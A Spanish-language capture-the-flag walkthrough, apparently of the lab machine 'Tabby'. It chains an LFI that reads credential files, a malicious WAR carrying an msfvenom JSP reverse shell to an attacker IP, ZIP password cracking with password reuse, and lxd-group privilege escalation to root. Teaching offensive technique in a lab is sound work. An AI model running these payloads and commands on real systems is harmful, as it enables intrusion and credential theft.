// 01

Reconocimiento

1
PUERTOS Y VHOST
NMAP
$ sudo nmap -p- -n -Pn -sS --min-rate 3000 --max-retries 1 10.129.5.190
$ echo '10.129.5.190 megahosting.htb tabby' | sudo tee -a /etc/hosts
22/tcp open ssh OpenSSH 8.2p1
80/tcp open http Apache httpd 2.4.41 (megahosting.htb)
8080/tcp open http Apache Tomcat

// NOTA

Dos webs: «Mega Hosting» en el 80 y un Tomcat en el 8080. El plan natural es buscar un fallo en la web del 80 que entregue credenciales para el Tomcat.

// 02

LFI y credenciales Tomcat

2
CONFIRMAR EL LFI
CURL
$ curl 'http://megahosting.htb/news.php?file=../../../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
3
LEER TOMCAT-USERS.XML

Un LFI no solo lee /etc/passwd: el objetivo real son los ficheros de credenciales de otros servicios. En Ubuntu, el paquete de Tomcat 9 guarda sus usuarios en una ruta conocida.

CURL
$ curl 'http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml' | grep -i '<user'
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>

// LFI → CREDENCIALES DE UN SERVICIO DISTINTO

Dónde: news.php?file=, sin lista blanca ni bloqueo de ../.
Qué permite: leer tomcat-users.xml, con una cuenta en el rol manager-script — el que habilita el despliegue remoto de aplicaciones por la API de texto.

// 03

WAR y reverse shell

4
EMPAQUETAR Y DESPLEGAR UN WAR MALICIOSO
WAR DEPLOY
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f war -o /tmp/rev.war
$ curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file /tmp/rev.war \
'http://megahosting.htb:8080/manager/text/deploy?path=/rev&update=true'
OK - Deployed application at context path [/rev]
5
DISPARAR LA SHELL
LISTENER
$ nc -lvnp 4444 &
$ curl 'http://megahosting.htb:8080/rev/'
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
-rw-r--r-- 1 ash ash 8716 Jun 16 2020 16162020_backup.zip # en /var/www/html/files

// 04

Backup y usuario ash

6
DESCARGAR Y CRACKEAR EL BACKUP
JOHN
$ curl -o /tmp/16162020_backup.zip 'http://megahosting.htb/files/16162020_backup.zip'
$ zip2john /tmp/16162020_backup.zip > /tmp/hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash
admin@it (16162020_backup.zip)
7
CAMBIAR A ASH (CONTRASEÑA REUTILIZADA)
SU
tomcat@tabby:~$ (sleep 1; echo 'admin@it') | script -qec "su ash -c 'id; cat /home/ash/user.txt'" /dev/null
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
[flag oculta]

// REUTILIZACIÓN DE CONTRASEÑA

La contraseña del backup ZIP (admin@it) es la misma que usa ash para iniciar sesión en el sistema — y, decisivo para el siguiente paso, ash pertenece al grupo lxd.

// 05

Escalada por lxd

8
INICIALIZAR LXD Y CREAR EL CONTENEDOR PRIVILEGIADO

En esta instancia LXD no tenía ni storage ni imagen local: hubo que crear el pool, importar una Alpine minirootfs servida desde Kali y añadir el disco raíz al perfil por defecto antes de montar /.

LXD
ash@tabby:~$ lxc image import /home/ash/metadata.tar.gz /home/ash/alpine.tar.gz --alias alpine
ash@tabby:~$ lxc storage create default dir
ash@tabby:~$ lxc profile device add default root disk path=/ pool=default
ash@tabby:~$ lxc init alpine privesc -c security.privileged=true
ash@tabby:~$ lxc config device add privesc disco disk source=/ path=/mnt/root recursive=true
ash@tabby:~$ lxc start privesc
ash@tabby:~$ lxc exec privesc cat /mnt/root/root/root.txt
Storage pool default created
Device root added to default
Creating privesc
[flag oculta]

// FLAGS

user: [flag oculta] · root: [flag oculta]. Ruta completa: LFI → credenciales de Tomcat → WAR → tomcat → backup crackeado → ash → grupo lxd → root.

// 06

Referencia Comandos

msfvenom (WAR JSP)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=puerto -f war -o salida.war
Genera un WAR con una reverse shell JSP, listo para desplegar en el manager de Tomcat.
Tomcat manager/text/deploy
curl -u user:pass --upload-file app.war "URL/manager/text/deploy?path=/x&update=true"
Despliega una aplicación web en Tomcat vía HTTP, usando una cuenta con el rol manager-script.
zip2john / john
zip2john archivo.zip > hash ; john --wordlist=lista hash
Extrae y rompe la contraseña de un ZIP protegido por diccionario.
lxc image import / storage / profile
lxc image import meta.tar.gz rootfs.tar.gz --alias nombre
lxc storage create default dir
lxc profile device add default root disk path=/ pool=default
Secuencia completa para dejar operativo un LXD recién instalado sin storage ni imágenes, antes de crear el contenedor privilegiado.

// 07

Glosario

tomcat-users.xml
Fichero de configuración de Apache Tomcat con los usuarios y roles de la aplicación de gestión (Manager). Un LFI que llegue a él compromete el despliegue de aplicaciones.
manager-script / manager-gui
Roles de Tomcat para administrar el servidor. manager-script habilita la API de texto (/manager/text/), ideal de automatizar un despliegue de WAR malicioso.
WAR (Web Application Archive)
Formato empaquetado de una aplicación Java web. Si contiene un JSP con una shell, Tomcat la ejecuta en cuanto se visita su ruta tras el despliegue.
Reutilización de contraseñas
Práctica de usar la misma contraseña en varios sitios. Romper una contraseña débil (de un ZIP, por ejemplo) a menudo da acceso directo a una cuenta real del sistema.
Grupo lxd
Pertenecer a este grupo equivale a root: permite crear contenedores privilegiados con el sistema de archivos del host montado dentro.
